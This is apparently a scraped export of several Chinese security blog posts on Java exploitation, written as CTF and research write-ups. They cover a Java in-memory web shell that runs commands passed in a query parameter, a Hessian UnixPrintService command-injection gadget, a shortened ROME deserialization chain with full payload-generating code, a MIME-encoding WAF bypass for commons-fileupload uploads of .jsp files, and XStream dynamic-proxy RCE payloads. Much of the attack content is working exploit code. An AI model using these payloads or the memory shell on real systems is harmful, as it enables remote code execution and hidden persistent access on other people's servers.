com.sun.net.httpserver.HttpHandler;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.*;import java.lang.reflect.Field;public class Yyds extends AbstractTranslet implements HttpHandler &#123; public void handle(HttpExchange t) throws IOException &#123; String response = &quot;Y4tacker&#x27;s MemoryShell&quot;; String query = t.getRequestURI().getQuery(); String[] var3 = query.split(&quot;=&quot;); System.out.println(var3[0]+var3[1]); ByteArrayOutputStream output = null; if (var3[0].equals(&quot;y4tacker&quot;))&#123; InputStream inputStream = Runtime.getRuntime().exec(var3[1]).getInputStream(); output = new ByteArrayOutputStream(); byte[] buffer = new byte[4096]; int n = 0; while (-1 != (n = inputStream.read(buffer))) &#123; output.write(buffer, 0, n); &#125; &#125; response+=(&quot;\\n&quot;+new String(output.toByteArray())); t.sendResponseHeaders(200, (long)response.length()); OutputStream os = t.getResponseBody(); os.write(response.getBytes()); os.close(); &#125; public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; public Yyds() throws Exception &#123; super(); try&#123; Object obj = Thread.currentThread(); Field field = obj.getClass().getDeclaredField(&quot;group&quot;); field.setAccessible(true); obj = field.get(obj); field = obj.getClass().getDeclaredField(&quot;threads&quot;); field.setAccessible(true); obj = field.get(obj); Thread[] threads = (Thread[]) obj; for (Thread thread : threads) &#123; if (thread.getName().contains(&quot;Thread-2&quot;)) &#123; try &#123; field = thread.getClass().getDeclaredField(&quot;target&quot;); field.setAccessible(true); obj = field.get(thread); System.out.println(obj); field = obj.getClass().getDeclaredField(&quot;this$0&quot;); field.setAccessible(true); obj = field.get(obj); field = obj.getClass().getDeclaredField(&quot;contexts&quot;); field.setAccessible(true); obj = field.get(obj); field = obj.getClass().getDeclaredField(&quot;list&quot;); field.setAccessible(true); obj = field.get(obj); java.util.LinkedList lt = (java.util.LinkedList)obj; Object o = lt.get(0); field = o.getClass().getDeclaredField(&quot;handler&quot;); field.setAccessible(true); field.set(o,this); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125; &#125;catch (Exception e)&#123; &#125; &#125;&#125; 其实可以去静态块改一下，不然执行两次多多少少有点烦，就这样了so easy 当然太暴力了也不好哈哈哈，还可以在上面的sun.net.httpserver.ServerImpl$Dispatcher直接执行sun.net.httpserver.ServerImpl#createContext(java.lang.String, com.sun.net.httpserver.HttpHandler)创建新的路由即可 这里就不写了，一个字懒，反正也不难 实现效果 利用二：UnixPrintService直接执行命令之前不清楚，后面@wuyx师傅提醒我才发现可以不用实现序列化接口，具体可以参考marshalsec的实现 123HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();sf.setAllowNonSerializable(true);output.setSerializerFactory(sf); 在sun.print.UnixPrintService的所有get方法都能触发，别看这个是Unix其实linux也有，在高版本被移除(有兴趣自己考古)，利用方式就是简单命令拼接执行（缺点就是太能弹了，基本上每个get方法都能弹） 它会去找public修饰的getter方法，而为什么会调用哪个私有方法其实也很简单比如说getAttributes里面就调用了这些触发命令执行的私有方法 1234567891011121314151617public PrintServiceAttributeSet getAttributes() &#123; HashPrintServiceAttributeSet var1 = new HashPrintServiceAttributeSet(); var1.add(this.getPrinterName()); var1.add(this.getPrinterIsAcceptingJobs()); PrinterState var2 = this.getPrinterState(); if (var2 != null) &#123; var1.add(var2); &#125; PrinterStateReasons var3 = this.getPrinterStateReasons(); if (var3 != null) &#123; var1.add(var3); &#125; var1.add(this.getQueuedJobCount()); return AttributeSetUtilities.unmodifiableView(var1);&#125; 12345678910111213141516171819Constructor&lt;UnixPrintService&gt; declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class);declaredConstructor.setAccessible(true);ObjectBean delegate = new ObjectBean(sun.print.UnixPrintService.class,declaredConstructor.newInstance(&quot;;open -na Calculator&quot;));ObjectBean root = new ObjectBean(ObjectBean.class, delegate);HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);//ByteArrayOutputStream os = new ByteArrayOutputStream();Hessian2Output output = new Hessian2Output(os);HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();sf.setAllowNonSerializable(true);output.setSerializerFactory(sf);output.writeObject(map);output.getBytesOutputStream().flush();output.completeMessage();output.close();System.out.println(new String(Base64.getEncoder().encode(os.toByteArray()))); 拿flag的话就两种方式JavaAgent注入内存马，或者本来就是ctf 1if [ `cut -c 1 flag` = &quot;a&quot; ];then sleep 2;fi 如何快速拿利用链在这次比赛后我简单学习了下用tabby，通过下面的neo4j查询语句，之后人工排查下 1match path=(m1:Method)-[:CALL*..3]-&gt;(m2:Method &#123;&#125;) where m1.NAME =~ &quot;get.*&quot; and m1.PARAMETER_SIZE=0 and (m2.NAME =~ &quot;exec.*&quot; or m2.NAME =~ &quot;readObject&quot;) return path 利用一： 利用二： 总的来说还是学的挺多，挺有收获的一个比赛","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"反序列化","slug":"反序列化","permalink":"https://y4tacker.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"ROME改造计划","slug":"year/2022/3/ROME改造计划","date":"2022-03-07T12:00:56.000Z","updated":"2024-08-04T09:01:49.192Z","comments":true,"path":"2022/03/07/year/2022/3/ROME改造计划/","link":"","permalink":"https://y4tacker.github.io/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/","excerpt":"","text":"ROME改造计划成果从ysoserial原本的4000+缩短到1320（Base64+弹计算器） 写在前面​ 首先非常感谢这次的D^3CTF给我一次学习的机会，两个Java题都挺有意思学到了不同的东西，因为第二个比较简单就不分享了，这里分享一下如何去缩短ROME利用链，本身我也是之前没学习过ROME，这里以一个旁观者的视角来讲述好累，全篇没有各种高级技术不涉及ASM的改造，仅仅只是一些Trick和利用链的精简，同时非常感谢我的同学@HolaAs以及我的朋友@风潇在我做题过程当中给我的帮助 简单分析首先看看路由，很简单要求传入字符长度不超过1956 接下来免不了找依赖后面发现了ROME可以用，在ysoserial里面直接食用，可以惊讶的看到这里只有短短的4400那么“短”，痛！太痛了！ 哎呀怎么办呢？既然要改造免不了需要先看看调用链 1234567891011121314151617/** * * TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * ObjectBean.toString() * EqualsBean.beanHashCode() * ObjectBean.hashCode() * HashMap&lt;K,V&gt;.hash(Object) * HashMap&lt;K,V&gt;.readObject(ObjectInputStream) * * */ 既然要改造我的思路是，先精简利用链，再减少细节 看到这里我能有个想法就是从调用readObject到tostring都能尝试类替换，最下层的个人感觉似乎没啥必要了，那直接再往上啰？ 简单了解很明显，既然要尝试去改造一条链子，那第一步就要去深入了解他！ 这里就省去介绍ObjectBean、ToStringBean等类了百度都有，不做搬运工 先做个简单总结 HashMap-&gt;readObject 触发 ObjectBean-&gt;hashCode 触发ObjectBean 内封装的 ObjectBean -&gt; toString 方法，之后就可以触发利用链 也简单看看图啰 EqualsBean触发toString 紧接着com.sun.syndication.feed.impl.ToStringBean#toString(java.lang.String)会调用所有 getter 方法，多提一嘴其实BeanIntrospector.getPropertyDescriptors会获取所有getter/setter，但是下面有参数长度0那按照正常人代码就只剩getter了 因此最终通过触发getOutputProperties实现字节码加载 通常ysoserial更细节，会多很多细节，可能会更短，但不影响，这里我们简单按照逻辑写一下代码，加深理解 果然不出我所料更长了！ 但这里主要是学习思路 改造失败滴改造尝试可以很明显的看到在这里有个触发toString的过程，那么很容易就能想到之前通过BadAttributeValueExpException去触发toString这件事，构造完后看看，哦寄了！属于是帮倒忙第一名了，拜拜再见不联系了嘞！ 成功滴改造尝试Step1–改造利用链在之前的过程当中有个地方非常吸引我，com.sun.syndication.feed.impl.EqualsBean#equals方法 可以看到equals最终调用beanEquals这不就和com.sun.syndication.feed.impl.ToStringBean#toString很像么，但是如何能触发equals方法呢 借用p牛的一句话，但是jdk7u21的场景不适合我们这里，原因请看p牛知识星球（打波广告p牛看到请给钱） 调用equals的场景就是集合set。set中储存的对象不允许重复，所以在添加对象的时候，势必会涉及到比较操作 但是这个很明显并不适合我们这个场景（两个相同对象hashCode都一样了就不可能成功了，不多说自己想） 那还有啥利用么，当然有的，比如HashMap对key也有这个神奇的机制， 为了解决这个问题，我们抽丝剥茧慢慢来啰，下面的只是对后面做铺垫 先来个简单的场景，首先看下面这个代码 123456HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();HashMap&lt;Object, Object&gt; objectObjectHashMap1 = new HashMap&lt;&gt;();objectObjectHashMap.put(&quot;aa&quot;,&quot;&quot;);objectObjectHashMap1.put(&quot;bB&quot;,&quot;&quot;);System.out.println(objectObjectHashMap.hashCode());System.out.println(objectObjectHashMap1.hashCode()); 会觉得他们相同吗，答案很显然 为什么呢，可以看到，由于我们value为空其实就是比较key的hashCode了 123public final int hashCode() &#123; return Objects.hashCode(key) ^ Objects.hashCode(value);&#125; 对于一个String类型其hashCode，考虑两个元素的场景也就是31*val[0]+val[1]=31val[0]+val[1]，因此第一个元素如果比第二个元素小1，第二个元素就必须比第一个元素大31 现在场景提升 1234objectObjectHashMap.put(&quot;aa&quot;,&quot;1&quot;);objectObjectHashMap.put(&quot;bB&quot;,&quot;2&quot;);objectObjectHashMap1.put(&quot;aa&quot;,&quot;2&quot;);objectObjectHashMap1.put(&quot;bB&quot;,&quot;1&quot;); 仍然相等，对于这个场景里面有两个元素，它会调用父类的java.util.AbstractMap#hashCode 1234567public int hashCode() &#123; int h = 0; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) h += i.next().hashCode(); return h;&#125; 为了简化理解可以把上面的场景代码简化为(毕竟aa与bB相等)，这样看是不是就很好理解了 1234objectObjectHashMap.put(&quot;aa&quot;,&quot;1&quot;);objectObjectHashMap.put(&quot;aa&quot;,&quot;2&quot;);objectObjectHashMap1.put(&quot;aa&quot;,&quot;2&quot;);objectObjectHashMap1.put(&quot;aa&quot;,&quot;1&quot;); 有了这个基础，再次回到我们构造ROME的过程当中 现在我们已经知道了java.util.HashMap#putVal在key的hashCode一致的时候会触发equals方法调用，但是此刻我们的代码的key是String类型调用了也没用啊，这里很巧的是在HashMap的equals方法当中,当对象大于1时会转而调用父类java.util.AbstractMap#equals,可以很明显看到这里调用了value.equals，同时这里我们需要将equals的传参数改为TemplatesImpl对象 那如何搞定呢，那就是把两个map的value颠倒一下具体为什么自己想想很简单(“aa”=&gt;bean.quals(“aa”=&gt;templates))这里=&gt;表示对应 1234map1.put(&quot;aa&quot;,templates);map1.put(&quot;bB&quot;,bean);map2.put(&quot;aa&quot;,bean);map2.put(&quot;bB&quot;,templates); 因此安这个思路我们可以得到 痛！太痛了！不过还是缩了一千多了？ 仔细一想罪魁祸首就是 Gadgets.createTemplatesImpl(command); Step2–超级小Trick那我们来看看这个ysoserial生成的类是啥样子 这里很多东西我们都可以改，啥serialVersionUID、Pwner311912468728708、等等这些都可以拿下 但是你以为这样就ok了，给大家看个骚的 没有trycatch，没有实现抽象类的方法，这怎么实现的！！！ 我们平时javac编译的时候，同样的代码都会报错 那上面这个咋搞的嘞，而且不报错，那就是javassist啰，不用ASM去操作好极了 现在再看看长度嘞，1324小草莓坏笑 测试下嘞ok计算器来了，记得url编码一下哦！ 最终代码Rome.java 123456789101112131415161718192021222324252627282930313233343536373839import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.syndication.feed.impl.EqualsBean;import javax.xml.transform.Templates;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.util.Base64;import java.util.HashMap;import static sec.payload.Payload.setFieldValue;public class Rome &#123; public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = GetTemplatesImpl.getTemplatesImpl(); EqualsBean bean = new EqualsBean(String.class,&quot;&quot;); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); map1.put(&quot;aa&quot;,templates); map1.put(&quot;bB&quot;,bean); map2.put(&quot;aa&quot;,bean); map2.put(&quot;bB&quot;,templates); HashMap map = new HashMap(); map.put(map1,&quot;&quot;); map.put(map2,&quot;&quot;); setFieldValue(bean,&quot;_beanClass&quot;,Templates.class); setFieldValue(bean,&quot;_obj&quot;,templates); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(map); System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()))); System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())).length()); &#125;&#125; GetTemplatesImpl.java 12345678910111213141516171819202122232425import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import java.lang.reflect.Field;public class GetTemplatesImpl &#123; public static TemplatesImpl getTemplatesImpl() throws Exception&#123; byte[][] bytes = new byte[][]&#123;GenerateEvilByJavaassist.generate()&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, &quot;_bytecodes&quot;, bytes); setValue(templates, &quot;_name&quot;, &quot;1&quot;); setValue(templates, &quot;_tfactory&quot;, null); return templates; &#125; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125;&#125; GenerateEvilByJavaassist.java 12345678910111213141516171819import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;public class GenerateEvilByJavaassist &#123; public static byte[] generate() throws Exception&#123; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(&quot;a&quot;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz); constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;open -na Calculator\\&quot;);&quot;); clazz.addConstructor(constructor); return clazz.toBytecode(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"反序列化","slug":"反序列化","permalink":"https://y4tacker.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Java文件上传大杀器-绕waf(针对commons-fileupload组件)","slug":"year/2022/2/Java文件上传大杀器-绕waf(针对commons-fileupload组件)","date":"2022-02-25T02:06:55.000Z","updated":"2024-08-04T09:01:49.093Z","comments":true,"path":"2022/02/25/year/2022/2/Java文件上传大杀器-绕waf(针对commons-fileupload组件)/","link":"","permalink":"https://y4tacker.github.io/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/","excerpt":"","text":"Java文件上传大杀器-绕waf(针对commons-fileupload组件)PS：高版本才有1.3以上 来个中二的标题，哈哈哈，灵感来源于昨晚赛博群有个师傅@我是killer发了篇新文章，在那篇文章当中提到了在filename=&quot;1.jsp&quot;的filename字符左右可以加上一些空白字符%20 %09 %0a %0b %0c %0d %1c %1d %1e %1f，比如%20filename%0a=&quot;1.jsp&quot;(直接用url编码为了区别)这样导致waf匹配不到我们上传⽂件 名，⽽我们上传依然可以解析，我对次进行了更深入的研究，也是对师傅文章对一次补充，下面为了衔接还是先梳理一遍，看过赛博群的师傅可以先跳过前面的部分，直接看最后一部分(毕竟我想发个博客) 上传代码针对使⽤commons-fileupload处理⽂件上传 12345678910111213141516public class TestServlet extends HttpServlet &#123; public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String path = &quot;/Users/y4tacker/Desktop/JavaStudy/testtest&quot;; try &#123; ServletFileUpload servletFileUpload = new ServletFileUpload(new DiskFileItemFactory()); servletFileUpload.setHeaderEncoding(&quot;UTF-8&quot;); List&lt;FileItem&gt; fileItems = servletFileUpload.parseRequest(request); for (FileItem fileItem : fileItems) &#123; response.getWriter().write(fileItem.getName()); fileItem.write(new File(path+&quot;/&quot;+fileItem.getName())); &#125; &#125;catch (Exception e)&#123; &#125; &#125;&#125; 前置分析将断点打在servletFileUpload.parseRequest(request),跟入getItemIterator 一直往下到org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImpl Content-Type 要开头为 multipart/ 接下来对流的处理部分忽略，到下面有个this.boundary = FileUploadBase.this.getBoundary(contentType);,因为文件上传的格式就是,可以猜出这里就是解析这一部分 12345------WebKitFormBoundaryTyBDoKvamN58lcEwContent-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;1.jsp&quot;233------WebKitFormBoundaryTyBDoKvamN58lcEw-- 当时师傅跳过中间一些部分到了org.apache.commons.fileupload.FileUploadBase#getFileName(java.lang.String) 在parser.parse(pContentDisposition, &#39;;&#39;);，简单说下作用是先⽤分号将 form-data; name=&quot;file&quot;; filename=&quot;1.jsp&quot; 分割然后获取 等于号前⾯的值，这里我们看看到getToken当中的栈（方便大家调试） 12345678getToken:99, ParameterParser (org.apache.commons.fileupload)parseToken:162, ParameterParser (org.apache.commons.fileupload)parse:311, ParameterParser (org.apache.commons.fileupload)parse:279, ParameterParser (org.apache.commons.fileupload)parse:262, ParameterParser (org.apache.commons.fileupload)parse:246, ParameterParser (org.apache.commons.fileupload)getBoundary:423, FileUploadBase (org.apache.commons.fileupload)&lt;init&gt;:988, FileUploadBase$FileItemIteratorImpl 这里有个到 Character.isWhitespace，也就是@我是killer师傅提到的点，也是我们开篇前言中说到的利用方式，就不多提了 正文开启看看getFileName调用前，其实传入了一个headers，这个headers来源于上面的this.multi 而这个multi来源，还与我们上面的bundary有关 继续回到上面的getFileName之前this.boundary = FileUploadBase.this.getBoundary(contentType); 失败的绕waf点从这里可以看到和上面getFileName的分隔符不一样，这里用了两个分隔符，那么这里我就在想如果getFileName那里如果和这个逻辑不相关岂不是可以拿下 我们知道上面getFileName的参数来源于org.apache.commons.fileupload.MultipartStream#readHeaders，可以看到这里是通过for循环遍历并调用getBytes获取 而这个input来源就是我们之前传入的输入流 因此这里的绕过思路便是无法奏效，主要原因是，看getFilename这里，分割符只有;，我也是麻了 成功的绕waf点在org.apache.commons.fileupload.ParameterParser#parse(char[], int, int, char)， wow！！，这里对value进行了MimeUtility.decodeText操作 我们知道对MIME的编码出现在邮件中，因为 SMTP 协议一开始只支持纯 ASCII 文本的传输，这种情况下，二进制数据要通过 MIME 编码才能发送 那我们来看看这个decode里面干了啥,我直接看了下面如果=?开头则会调用decode方法 我来对这串又臭又长的代码进行解读，主要是为了符合RFC 2047规范 要求以=?开头 之后要求还要有一个?，中间的内容为编码，也就是=?charset? 获取下一个?间的内容，这里与下面的编解码有关 之后定位到最后一个?=间内容执行解码 这里我们来一个实例方便理解上面步骤=?gbk?Q?=31=2e=6a=73=70?= 从上面的步骤可以看到对指支持两种解码一种是B一种Q，分别对应Base64以及Quoted-printable编码，对于前者大家都很熟悉，对于后者我们这里只说如何编码 Quoted-printable将任何8-bit字节值可编码为3个字符：一个等号”=”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值。例如，ASCII码换页符（十进制值为12）可以表示为”=0C”， 等号”=”（十进制值为61）必须表示为”=3D”，gb2312下“中”表示为=D6=D0 因此我们就可以对这个value进行一些编码的骚操作，下面我们来梳理下可利用的点 一个是控制字符串的编码，这里支持编码很多因为是调用new String(decodedData, javaCharset(charset))，这个javaCharset函数预制了一些，可以看到如果不是这里面的就直接返回那个指，而new String函数里面会调用所有java支持的编码格式去解析，也就是charsets.jar里面的内容 1234567891011121314151617181920private static String javaCharset(String charset) &#123; if (charset == null) &#123; return null; &#125; else &#123; String mappedCharset = (String)MIME2JAVA.get(charset.toLowerCase(Locale.ENGLISH)); return mappedCharset == null ? charset : mappedCharset; &#125;&#125;static &#123; MIME2JAVA.put(&quot;iso-2022-cn&quot;, &quot;ISO2022CN&quot;); MIME2JAVA.put(&quot;iso-2022-kr&quot;, &quot;ISO2022KR&quot;); MIME2JAVA.put(&quot;utf-8&quot;, &quot;UTF8&quot;); MIME2JAVA.put(&quot;utf8&quot;, &quot;UTF8&quot;); MIME2JAVA.put(&quot;ja_jp.iso2022-7&quot;, &quot;ISO2022JP&quot;); MIME2JAVA.put(&quot;ja_jp.eucjp&quot;, &quot;EUCJIS&quot;); MIME2JAVA.put(&quot;euc-kr&quot;, &quot;KSC5601&quot;); MIME2JAVA.put(&quot;euckr&quot;, &quot;KSC5601&quot;); MIME2JAVA.put(&quot;us-ascii&quot;, &quot;ISO-8859-1&quot;); MIME2JAVA.put(&quot;x-us-ascii&quot;, &quot;ISO-8859-1&quot;);&#125; 控制Base64以及Quoted-printable去解码 这里来测试一下，对能编码的都编码一遍 成功上传怎么说 继续增强混淆还记得吗，当时说的只会提取=??=之间的内容，那我们在后面加点其他东西也可以，当然boundary==?gbk?Q?=2d=2d=2d=2d=57=65=62=4b=69=74=46=6f=72=6d=42=6f=75=6e=64=61=72=79=54=79=42=44=6f=4b=76=61=6d=4e=35=38=6c=63=45=77?=这个不能加，因为他在header头，会造成解析出问题 你以为就这就完了？再回到org.apache.commons.fileupload.util.mime.MimeUtility#decodeText，这里还有判断 \\t\\r\\n 直接解释代码有点累了，看图啥都懂了 测试相关代码整合在一起了,最后再次感谢@我是killer师傅的文章带给我的思路 12345678910111213import base64name = &quot;test&quot;encode = name.encode(&quot;utf-8&quot;)b = base64.b64encode(encode)print(&quot;=?utf-8?B?&quot;+b.decode()+&quot;?=&quot;)res = &quot;&quot;for i in encode.decode(&quot;gbk&quot;): tmp = hex(ord(i)).split(&quot;0x&quot;)[1] res += f&quot;=&#123;tmp&#125;&quot;print(&quot;=?gbk?Q?&quot;+res+&quot;?=&quot;)","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Waf","slug":"Waf","permalink":"https://y4tacker.github.io/tags/Waf/"}]},{"title":"XStream反序列化","slug":"year/2022/2/XStream反序列化","date":"2022-02-10T03:06:07.000Z","updated":"2024-08-04T09:01:49.133Z","comments":true,"path":"2022/02/10/year/2022/2/XStream反序列化/","link":"","permalink":"https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"XStream反序列化XStream简介XStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。 反序列化基本原理XStream实现了一套序列化和反序列化机制，核心是通过Converter转换器来将XML和对象之间进行相互的转换，XStream反序列化漏洞的存在是因为XStream支持一个名为DynamicProxyConverter的转换器，该转换器可以将XML中dynamic-proxy标签内容转换成动态代理类对象，而当程序调用了dynamic-proxy标签内的interface标签指向的接口类声明的方法时，就会通过动态代理机制代理访问dynamic-proxy标签内handler标签指定的类方法；利用这个机制，攻击者可以构造恶意的XML内容，即dynamic-proxy标签内的handler标签指向如EventHandler类这种可实现任意函数反射调用的恶意类、interface标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意XML内容后即可触发反序列化漏洞、达到任意代码执行的目的。 当然在这之前简单介绍几个重要的小知识 EventHandler类EventHandler类是实现了InvocationHandler的一个类，设计本意是为交互工具提供beans，建立从用户界面到应用程序逻辑的连接 EventHandler类定义的代码如下，其含有target和action属性，在EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()的函数调用链中，会将前面两个属性作为类方法和参数继续反射调用 1234567891011121314151617181920public static Object invoke(Method var0, Object var1, Object[] var2) throws InvocationTargetException, IllegalAccessException &#123; try &#123; return bounce.invoke((Object)null, var0, var1, var2); &#125; catch (InvocationTargetException var5) &#123; Throwable var4 = var5.getCause(); if (var4 instanceof InvocationTargetException) &#123; throw (InvocationTargetException)var4; &#125; else if (var4 instanceof IllegalAccessException) &#123; throw (IllegalAccessException)var4; &#125; else if (var4 instanceof RuntimeException) &#123; throw (RuntimeException)var4; &#125; else if (var4 instanceof Error) &#123; throw (Error)var4; &#125; else &#123; throw new Error(&quot;Unexpected invocation error&quot;, var4); &#125; &#125; catch (IllegalAccessException var6) &#123; throw new Error(&quot;Unexpected invocation error&quot;, var6); &#125; &#125; Converter转换器XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。 转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。 简单地说，就是输入XML后它能识别其中的标签字段并转换为相应的对象，反之亦然。 转换器需要实现3个方法： canConvert方法：告诉XStream对象，它能够转换的对象； marshal方法：能够将对象转换为XML时候的具体操作； unmarshal方法：能够将XML转换为对象时的具体操作； 具体参考：http://x-stream.github.io/converters.html POC分析当然基本的demo还是要给一个 1234567public class Test &#123; public static void main(String[] args) throws Exception&#123; FileInputStream fileInputStream = new FileInputStream(&quot;payload.txt&quot;); XStream xStream = new XStream(new DomDriver()); xStream.fromXML(fileInputStream); &#125;&#125; 1.sorted-set影响版本1.4.5，1.4.6，1.4.10 分析经典调用计算器 123456789101112131415&lt;sorted-set&gt; &lt;dynamic-proxy&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=&quot;java.beans.EventHandler&quot;&gt; &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;-na&lt;/string&gt; &lt;string&gt;Calculator&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt; 现在我们来对流程进行追踪，在AbstractTreeMarshallingStrategy.unmarshal()函数中，调用了TreeUnmarshaller.start()函数，即开始解析XML 我们直接从com.thoughtworks.xstream.core.TreeUnmarshaller#start开始 发现会调用HierarchicalStreams.readClassType()来获取到PoC XML中根标签的类类型 最终在com.thoughtworks.xstream.mapper.ClassAliasingMapper#realClass找到了java.util.SortedSet 接着是调用convertAnother()函数对java.util.SortedSet类型进行转换，我们跟进去该函数，其中调用mapper.defaultImplementationOf()函数来寻找java.util.SortedSet类型的默认实现类型进行替换，这里转换为了java.util.TreeSet类型 接着看到调用converterLookup.lookupConverterForType()来寻找TreeSet对应类型的转换器，可以看到这里的逻辑是，迭代this.converters，直到找到能转换出TreeSet类型 往下调试，在AbstractReferenceUnmarshaller.convert()函数中看到，会调用getCurrentReferenceKey()来获取当前的Reference键即标签名，接着将当前标签名压入parentStack栈中 之后调用其父类即的FastStack.convert()方法，跟进去，显示将类型压入栈，然后调用转换器TreeSetConverter的unmarshal()方法 往下调试，his.treeMapConverter.populateTreeMap()看英文名就能知道是填充TreeMap，跟进这里先判断是否是第一个元素，是的话就调用putCurrentEntryIntoMap()函数，即将当前内容填充到Map中 跟进去，发现调用readItem()函数读取标签内的内容并缓存到target这个Map中 跟入，一直到com.thoughtworks.xstream.mapper.CachingMapper#realClass，现在他就会去寻找这个dynamic-proxy所对应的类 最后找到这个类 接下来回到com.thoughtworks.xstream.core.TreeUnmarshaller#convertAnother(java.lang.Object, java.lang.Class, com.thoughtworks.xstream.converters.Converter)，找到这个动态代理类的转换器 接下来还是调用getCurrentReferenceKey()来获取当前的Reference键即标签名，接着将当前标签名压入parentStack栈中 之后一直到这里最重要的部分com.thoughtworks.xstream.converters.extended.DynamicProxyConverter#unmarshal，这里按标签内容生成对应接口的动态代理，此时这个DUMMY是一个空的代理实现 继续往下执行handler = (InvocationHandler)context.convertAnother(proxy, handlerType);，接下来转换器转换最终得到EventHandler 接下来替换代理 之后再回到之前的com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap，这里会把结果把存到result 最终 调用到java.beans.EventHandler#invokeInternal，之后用反射调用ProcessBuilder的start方法触发命令执行 其他说明在小于等于1.3.1版本，运行报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用 在1.4-1.4.5版本无法触发的原因 在TreeSetConverter.unmarshal()中，只有当sortedMapField和treeMap不为null时，才能进入populateTreeMap() 而在1.4-1.4.4版本中，sortedMapField默认为null，因此无法成功利用,这里以1.4.4版本为例 在1.4.7-1.4.9版本中，ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤 2.tree-map适用范围版本&lt;=1.4.6或=1.4.10 分析和sorted-map差不多，直接给payload 123456789101112131415161718&lt;tree-map&gt; &lt;entry&gt; &lt;dynamic-proxy&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=&quot;java.beans.EventHandler&quot;&gt; &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;-na&lt;/string&gt; &lt;string&gt;Calculator&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt; 